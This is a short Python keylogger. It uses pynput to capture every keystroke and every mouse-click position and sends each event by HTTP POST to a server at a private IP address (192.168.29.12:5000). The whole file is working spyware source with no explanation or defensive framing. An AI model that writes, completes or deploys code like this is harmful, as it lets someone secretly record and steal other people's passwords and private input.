import logging
from pynput import keyboard, mouse
import requests

def send_data_to_server(data):
	url = 'http://192.168.29.12:5000/receive-data'
	payload = {'keylog': data}
	requests.post(url, data=payload)
    
# Function to log keystrokes
def log_keystroke(key):
	try:
		send_data_to_server(key.char)
	except AttributeError:
		send_data_to_server(str(key))

# Function to log mouse clicks
def log_mouse_click(x, y, button, pressed):
	if pressed:
		send_data_to_server('Mouse click at ({}, {})'.format(x, y))

# Hook the keyboard event
keyboard_listener = keyboard.Listener(on_press=log_keystroke)
keyboard_listener.start()

# Hook the mouse click event
mouse_listener = mouse.Listener(on_click=log_mouse_click)
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()

